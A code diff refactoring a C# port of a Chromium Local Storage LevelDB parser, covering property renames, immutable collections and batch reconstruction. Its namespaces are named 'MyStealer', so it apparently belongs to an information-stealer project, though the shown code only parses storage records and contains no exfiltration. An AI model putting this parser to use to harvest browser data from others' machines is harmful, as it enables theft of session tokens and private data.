@@ -22,11 +22,12 @@
 using System.Collections.Generic;
 using System;
 using System.Text;
-using MyStealer.Handler.Chromium;
 using System.IO;
 using static CclLevelDb;
-using MyStealer.Handler.Chromium.LevelDb;
 using System.Linq;
+using System.Collections.Immutable;
+using MyStealer.Utils.Chromium.LevelDb;
+using MyStealer.Utils.Chromium;
 
 /// <summary>
 /// Ported from ccl_leveldb.py using pytocs 2.0.0-3150cbcd42
@@ -56,17 +57,12 @@ public static class CclChromiumLocalStorage
 
     public static byte _RECORD_KEY_PREFIX = (byte)'_';
 
-    public static string EIGHT_BIT_ENCODING = "iso-8859-1";
-
-    // todo: remove this proxy func
-    public static DateTime from_chrome_timestamp(int microseconds) => ChromiumTimeStamp.ToUtc(microseconds);
-
     // 
     //     decodes a type-prefixed string - prefix of: 0=utf-16-le; 1=an extended ascii codepage (likely dependant on locale)
     //     :param raw: raw prefixed-string data
     //     :return: decoded string
     //     
-    public static string decode_string(byte[] raw)
+    private static string DecodeString(byte[] raw)
     {
         var prefix = raw[0];
         if (prefix == 0)
@@ -79,127 +75,100 @@ public static class CclChromiumLocalStorage
 
     public class StorageEntry
     {
-        public string storage_key;
+        public string StorageKey { get; protected set; }
 
-        public ulong leveldb_seq_number;
+        public ulong Seq { get; protected set; }
     }
 
     public class StorageMetadata : StorageEntry
     {
-        public DateTime timestamp;
+        public DateTime TimeStamp { get; }
 
-        public int size_in_bytes;
+        public int SizeInBytes { get; }
 
-        public StorageMetadata(string storage_key, DateTime timestamp, int size_in_bytes, ulong leveldb_seq_number)
+        public StorageMetadata(string storageKey, DateTime timestamp, int sizeInBytes, ulong seq)
         {
-            this.storage_key = storage_key;
-            this.timestamp = timestamp;
-            this.size_in_bytes = size_in_bytes;
-            this.leveldb_seq_number = leveldb_seq_number;
+            StorageKey = storageKey;
+            TimeStamp = timestamp;
+            SizeInBytes = sizeInBytes;
+            Seq = seq;
         }
 
-        public static StorageMetadata from_protobuff(string storage_key, byte[] data, ulong seq)
+        public static StorageMetadata FromProtobuff(string storageKey, byte[] data, ulong seq)
         {
             using (var stream = new MemoryStream(data))
             {
                 // This is a simple protobuff, so we'll read it directly, but with checks, rather than add a dependency
-                var ts_tag = CclLevelDb.read_le_varint(stream);
+                var ts_tag = stream.ReadVarInt();
                 if ((ts_tag & 0x07) != 0 || ts_tag >> 3 != 1)
                     throw new Exception("Unexpected tag when reading StorageMetadata from protobuff");
 
-                var timestamp = from_chrome_timestamp(CclLevelDb.read_le_varint(stream));
-                var size_tag = CclLevelDb.read_le_varint(stream);
+                var timestamp = ChromiumTimeStamp.ToUtc(stream.ReadVarInt());
+                var size_tag = stream.ReadVarInt();
                 if ((size_tag & 0x07) != 0 || size_tag >> 3 != 2)
                     throw new Exception("Unexpected tag when reading StorageMetadata from protobuff");
 
-                var size = CclLevelDb.read_le_varint(stream);
-                return new StorageMetadata(storage_key, timestamp, size, seq);
+                var size = stream.ReadVarInt();
+                return new StorageMetadata(storageKey, timestamp, size, seq);
             }
         }
     }
 
     public class LocalStorageRecord : StorageEntry
     {
-        public string script_key;
+        public string ScriptKey { get; }
 
-        public string value;
+        public string Value { get; }
 
-        public bool is_live;
+        public bool IsLive { get; }
 
-        public LocalStorageRecord(string storage_key, string script_key, string value, ulong leveldb_seq_number, bool is_live)
+        public LocalStorageRecord(string storageKey, string scriptKey, string value, ulong seq, bool islive)
         {
-            this.storage_key = storage_key;
-            this.script_key = script_key;
-            this.value = value;
-            this.leveldb_seq_number = leveldb_seq_number;
-            this.is_live = is_live;
+            StorageKey = storageKey;
+            ScriptKey = scriptKey;
+            Value = value;
+            Seq = seq;
+            IsLive = islive;
         }
     }
 
     public class LocalStorageBatch
     {
+        private readonly StorageMetadata meta;
 
-        public ulong _end;
-
-        public StorageMetadata _meta;
+        public ulong End { get; }
 
         public LocalStorageBatch(StorageMetadata meta, ulong end_seq)
         {
-            _meta = meta;
-            _end = end_seq;
+            this.meta = meta;
+            End = end_seq;
         }
 
-        public string storage_key
-        {
-            get
-            {
-                return _meta.storage_key;
-            }
-        }
+        public string StorageKey => meta.StorageKey;
 
-        public DateTime timestamp
-        {
-            get
-            {
-                return _meta.timestamp;
-            }
-        }
+        public DateTime TimeStamp => meta.TimeStamp;
 
-        public ulong start
-        {
-            get
-            {
-                return _meta.leveldb_seq_number;
-            }
-        }
+        public ulong Start => meta.Seq;
 
-        public ulong end
-        {
-            get
-            {
-                return _end;
-            }
-        }
-
-        public override string ToString() => $"{nameof(LocalStorageBatch)}{{storage_key={storage_key}, timestamp={timestamp}, start={start}, end={end}}}";
+        public override string ToString() => $"{nameof(LocalStorageBatch)}{{storage_key={StorageKey}, timestamp={TimeStamp}, start={Start}, end={End}}}";
     }
 
     public class LocalStoreDb : IDisposable
     {
 
-        public ISet<string> _all_storage_keys;
+        private readonly IImmutableSet<string> allStorageKeys;
 
-        public List<ulong> _batch_starts;
+        private readonly ImmutableArray<ulong> batchStarts;
 
-        public Dictionary<ulong, LocalStorageBatch> _batches;
+        private readonly IImmutableDictionary<ulong, LocalStorageBatch> batches;
 
-        public List<StorageEntry> _flat_items;
+        private readonly IImmutableList<StorageEntry> flatItems;
 
-        public RawLevelDb _ldb;
+        private readonly RawLevelDb ldb;
 
-        public Dictionary<string, Dictionary<string, Dictionary<ulong, LocalStorageRecord>>> _records;
+        private readonly IImmutableDictionary<string, IImmutableDictionary<string, IImmutableDictionary<ulong, LocalStorageRecord>>> records;
 
-        public Dictionary<string, Dictionary<ulong, StorageMetadata>> _storage_details;
+        private readonly IImmutableDictionary<string, IImmutableDictionary<ulong, StorageMetadata>> storageDetails;
 
         public LocalStoreDb(string in_dir)
         {
@@ -209,34 +178,35 @@ public static class CclChromiumLocalStorage
             if (!File.GetAttributes(in_dir).HasFlag(FileAttributes.Directory))
                 throw new IOException("Input directory is not a directory");
 
-            _ldb = new RawLevelDb(in_dir);
-            _storage_details = new Dictionary<string, Dictionary<ulong, StorageMetadata>>();
-            _flat_items = new List<StorageEntry>();
-            _records = new Dictionary<string, Dictionary<string, Dictionary<ulong, LocalStorageRecord>>>();
+            ldb = new RawLevelDb(in_dir);
 
-            foreach (var record in _ldb.iterate_records_raw())
+            var storageDetails = new Dictionary<string, Dictionary<ulong, StorageMetadata>>();
+            var flatItems = ImmutableList.CreateBuilder<StorageEntry>();
+            var records = new Dictionary<string, Dictionary<string, Dictionary<ulong, LocalStorageRecord>>>();
+
+            foreach (var record in ldb)
             {
-                if (record.user_key.StartsWith(_META_PREFIX) && record.state == KeyState.Live)
+                if (record.UserKey.StartsWith(_META_PREFIX) && record.State == KeyState.Live)
                 {
                     var metaLen = _META_PREFIX.Length;
-                    storage_key = Encoding.GetEncoding(EIGHT_BIT_ENCODING).GetString(record.user_key, metaLen, record.user_key.Length - metaLen);
-                    if (!_storage_details.ContainsKey(storage_key))
-                        _storage_details[storage_key] = new Dictionary<ulong, StorageMetadata>();
+                    storage_key = Encoding.Default.GetString(record.UserKey, metaLen, record.UserKey.Length - metaLen);
+                    if (!storageDetails.ContainsKey(storage_key))
+                        storageDetails[storage_key] = new Dictionary<ulong, StorageMetadata>();
 
-                    var metadata = StorageMetadata.from_protobuff(storage_key, record.value, record.seq);
-                    _storage_details[storage_key][record.seq] = metadata;
-                    _flat_items.Add(metadata);
+                    var metadata = StorageMetadata.FromProtobuff(storage_key, record.Value, record.Seq);
+                    storageDetails[storage_key][record.Seq] = metadata;
+                    flatItems.Add(metadata);
                 }
-                else if (record.user_key[0] == _RECORD_KEY_PREFIX)
+                else if (record.UserKey.Length > 0 && record.UserKey[0] == _RECORD_KEY_PREFIX)
                 {
                     // We include deleted records here because we need them to build batches
-                    (var storage_key_raw, var script_key_raw) = record.user_key.Split(0x00);
-                    storage_key = Encoding.GetEncoding(EIGHT_BIT_ENCODING).GetString(storage_key_raw, 1, storage_key_raw.Length - 1);
+                    (var storage_key_raw, var script_key_raw) = record.UserKey.Split(0x00);
+                    storage_key = Encoding.Default.GetString(storage_key_raw, 1, storage_key_raw.Length - 1);
 
-                    var script_key = decode_string(script_key_raw);
+                    var script_key = DecodeString(script_key_raw);
                     try
                     {
-                        value = record.state == CclLevelDb.KeyState.Live ? decode_string(record.value) : null;
+                        value = record.State == KeyState.Live ? DecodeString(record.Value) : null;
                     }
                     catch (DecoderFallbackException)
                     {
@@ -244,28 +214,31 @@ public static class CclChromiumLocalStorage
                         Console.WriteLine("Error decoding record value at seq no {record.seq}; {storage_key} {script_key}:  {record.value}");
                         continue;
                     }
-                    if (!_records.ContainsKey(storage_key))
-                        _records[storage_key] = new Dictionary<string, Dictionary<ulong, LocalStorageRecord>>();
-                    if (!_records[storage_key].ContainsKey(script_key))
-                        _records[storage_key][script_key] = new Dictionary<ulong, LocalStorageRecord>();
-                    var ls_record = new LocalStorageRecord(storage_key, script_key, value, record.seq, record.state == CclLevelDb.KeyState.Live);
-                    _records[storage_key][script_key][record.seq] = ls_record;
-                    _flat_items.Add(ls_record);
+
+                    if (!records.ContainsKey(storage_key))
+                        records[storage_key] = new Dictionary<string, Dictionary<ulong, LocalStorageRecord>>();
+                    if (!records[storage_key].ContainsKey(script_key))
+                        records[storage_key][script_key] = new Dictionary<ulong, LocalStorageRecord>();
+
+                    var ls_record = new LocalStorageRecord(storage_key, script_key, value, record.Seq, record.State == KeyState.Live);
+                    records[storage_key][script_key][record.Seq] = ls_record;
+                    flatItems.Add(ls_record);
                 }
             }
-            //this._storage_details = types.MappingProxyType(this._storage_details);
-            //this._records = types.MappingProxyType(this._records);
-            _all_storage_keys = new HashSet<string>(_storage_details.Keys.Concat(_records.Keys));
-            _flat_items.Sort((a, b) => a.leveldb_seq_number.CompareTo(b.leveldb_seq_number));
+            this.storageDetails = storageDetails.ToImmutableDictionary(e => e.Key, e => (IImmutableDictionary<ulong, StorageMetadata>)e.Value.ToImmutableDictionary());
+            this.records = records.ToImmutableDictionary(e => e.Key, e => (IImmutableDictionary<string, IImmutableDictionary<ulong, LocalStorageRecord>>)e.Value.ToImmutableDictionary(f => f.Key, f => (IImmutableDictionary<ulong, LocalStorageRecord>)f.Value.ToImmutableDictionary()));
+            allStorageKeys = storageDetails.Keys.Concat(records.Keys).ToImmutableHashSet();
+            flatItems.Sort((a, b) => a.Seq.CompareTo(b.Seq));
+            this.flatItems = flatItems.ToImmutable();
 
             // organise batches - this is made complex and slow by having to account for missing/deleted data
             // we're looking for a StorageMetadata followed by sequential (in terms of seq number) LocalStorageRecords
             // with the same storage key. Everything that falls within that chain can safely be considered a batch.
             // Any break in sequence numbers or storage key is a fail and can't be considered part of a batch.
-            _batches = new Dictionary<ulong, LocalStorageBatch>();
+            var batches = ImmutableDictionary.CreateBuilder<ulong, LocalStorageBatch>();
             StorageMetadata current_meta = null;
             var current_end = 0UL;
-            foreach (var item in _flat_items)
+            foreach (var item in flatItems)
             {
                 // pre-sorted
                 if (item is LocalStorageRecord)
@@ -275,17 +248,17 @@ public static class CclChromiumLocalStorage
                         // no currently valid metadata so we can't attribute this record to anything
                         continue;
                     }
-                    else if (item.leveldb_seq_number - current_end != 1 || item.storage_key != current_meta.storage_key)
+                    else if (item.Seq - current_end != 1 || item.StorageKey != current_meta.StorageKey)
                     {
                         // this record breaks a chain, so bundle up what we have and clear everything out
-                        _batches[current_meta.leveldb_seq_number] = new LocalStorageBatch(current_meta, current_end);
+                        batches[current_meta.Seq] = new LocalStorageBatch(current_meta, current_end);
                         current_meta = null;
                         current_end = 0;
                     }
                     else
                     {
                         // contiguous and right storage key, include in the current chain
-                        current_end = item.leveldb_seq_number;
+                        current_end = item.Seq;
                     }
                 }
                 else if (item is StorageMetadata)
@@ -293,10 +266,10 @@ public static class CclChromiumLocalStorage
                     if (current_meta != null)
                     {
                         // this record breaks a chain, so bundle up what we have, set new start
-                        _batches[current_meta.leveldb_seq_number] = new LocalStorageBatch(current_meta, current_end);
+                        batches[current_meta.Seq] = new LocalStorageBatch(current_meta, current_end);
                     }
                     current_meta = (StorageMetadata)item;
-                    current_end = item.leveldb_seq_number;
+                    current_end = item.Seq;
                 }
                 else
                 {
@@ -304,61 +277,58 @@ public static class CclChromiumLocalStorage
                 }
             }
             if (current_meta != null)
-                _batches[current_meta.leveldb_seq_number] = new LocalStorageBatch(current_meta, current_end);
+                batches[current_meta.Seq] = new LocalStorageBatch(current_meta, current_end);
+            this.batches = batches.ToImmutable();
 
-            _batch_starts = _batches.Keys.OrderBy(x => x).ToList();
+            batchStarts = batches.Keys.OrderBy(x => x).ToImmutableArray();
         }
 
-        public virtual IEnumerable<string> iter_storage_keys()
+        public virtual IEnumerable<string> EnumerateStorageKeys()
         {
-            foreach (var entry in _storage_details.Keys)
+            foreach (var entry in storageDetails.Keys)
                 yield return entry;
         }
 
-        public virtual bool contains_storage_key(string storage_key)
-        {
-            return _all_storage_keys.Contains(storage_key);
-        }
+        public virtual bool ContainsStorageKey(string storageKey) => allStorageKeys.Contains(storageKey);
 
-        public virtual IEnumerable<string> iter_script_keys(string storage_key)
+        public virtual IEnumerable<string> EnumerateScriptKeys(string storageKey)
         {
-            if (!_all_storage_keys.Contains(storage_key))
-            {
-                throw new KeyNotFoundException(storage_key);
-            }
-            if (!_records.ContainsKey(storage_key))
+            if (!allStorageKeys.Contains(storageKey))
+                throw new KeyNotFoundException(storageKey);
+
+            if (!records.ContainsKey(storageKey))
             {
                 //throw new StopIteration();
                 yield break;
             }
 
-            foreach (var entry in _records[storage_key].Keys)
+            foreach (var entry in records[storageKey].Keys)
                 yield return entry;
         }
 
-        public virtual bool contains_script_key(string storage_key, string script_key)
-            => _records.TryGetValue(storage_key, out var entry) && entry.ContainsKey(script_key);
+        public virtual bool ContainsScriptKey(string storageKey, string scriptKey)
+            => records.TryGetValue(storageKey, out var entry) && entry.ContainsKey(scriptKey);
 
         // 
         //         Finds the batch that a record with the given sequence number belongs to
         //         :param seq: leveldb sequence id
         //         :return: the batch containing the given sequence number or None if no batch contains it
         //         
-        public virtual LocalStorageBatch find_batch(ulong seq)
+        public virtual LocalStorageBatch FindBatch(ulong seq)
         {
-            var bin = _batch_starts.BinarySearch(seq, Comparer<ulong>.Default);
+            var bin = batchStarts.BinarySearch(seq, Comparer<ulong>.Default);
             if (bin < 0)
                 bin = ~bin;
             var i = bin - 1; // bisect.bisect_left(_batch_starts, seq) - 1
             if (i < 0)
                 return null;
 
-            var start = _batch_starts[i];
-            var batch = _batches[start];
-            if (batch.start <= seq && seq <= batch.end)
+            var start = batchStarts[i];
+            var batch = batches[start];
+            if (batch.Start <= seq && seq <= batch.End)
                 return batch;
-            else
-                return null;
+
+            return null;
         }
 
         // 
@@ -368,13 +338,13 @@ public static class CclChromiumLocalStorage
         //         
         public virtual IEnumerable<LocalStorageRecord> iter_all_records(bool include_deletions = false)
         {
-            foreach (var scriptDict in _records)
+            foreach (var scriptDict in records)
             {
                 foreach (var seqDict in scriptDict.Value)
                 {
                     foreach (var value in seqDict.Value.Values)
                     {
-                        if (value.is_live || include_deletions)
+                        if (value.IsLive || include_deletions)
                             yield return value;
                     }
                 }
@@ -389,14 +359,14 @@ public static class CclChromiumLocalStorage
         //         
         public virtual IEnumerable<LocalStorageRecord> iter_records_for_storage_key(string storage_key, bool include_deletions = false)
         {
-            if (!this.contains_storage_key(storage_key))
+            if (!ContainsStorageKey(storage_key))
                 throw new KeyNotFoundException(storage_key);
 
-            foreach (var record in _records[storage_key])
+            foreach (var record in records[storage_key])
             {
                 foreach (var value in record.Value.Values)
                 {
-                    if (value.is_live || include_deletions)
+                    if (value.IsLive || include_deletions)
                         yield return value;
                 }
             }
@@ -409,12 +379,12 @@ public static class CclChromiumLocalStorage
         //         
         public virtual IEnumerable<LocalStorageRecord> iter_records_for_script_key(string storage_key, string script_key, bool include_deletions = false)
         {
-            if (!this.contains_script_key(storage_key, script_key))
+            if (!ContainsScriptKey(storage_key, script_key))
                 throw new KeyNotFoundException("storage_key: " + storage_key + " script_key: " + script_key);
 
-            foreach (var value in _records[storage_key][script_key].Values)
+            foreach (var value in records[storage_key][script_key].Values)
             {
-                if (value.is_live || include_deletions)
+                if (value.IsLive || include_deletions)
                     yield return value;
             }
         }
@@ -424,7 +394,7 @@ public static class CclChromiumLocalStorage
         //         
         public virtual IEnumerable<StorageMetadata> iter_metadata()
         {
-            foreach (var meta in _flat_items)
+            foreach (var meta in flatItems)
             {
                 if (meta is StorageMetadata)
                     yield return (StorageMetadata)meta;
@@ -437,22 +407,22 @@ public static class CclChromiumLocalStorage
         //         
         public virtual IEnumerable<StorageMetadata> iter_metadata_for_storage_key(string storage_key)
         {
-            if (!_all_storage_keys.Contains(storage_key))
+            if (!allStorageKeys.Contains(storage_key))
                 throw new KeyNotFoundException(storage_key);
 
-            if (!_storage_details.ContainsKey(storage_key))
+            if (!storageDetails.ContainsKey(storage_key))
                 yield break;
 
-            foreach (var meta in _storage_details[storage_key].Values)
+            foreach (var meta in storageDetails[storage_key].Values)
                 yield return meta;
         }
 
         public virtual IEnumerable<KeyValuePair<ulong, LocalStorageBatch>> iter_batches()
         {
-            foreach (var batch in _batches)
+            foreach (var batch in batches)
                 yield return batch;
         }
 
-        public void Dispose() => ((IDisposable)_ldb).Dispose();
+        public void Dispose() => ((IDisposable)ldb).Dispose();
     }
 }
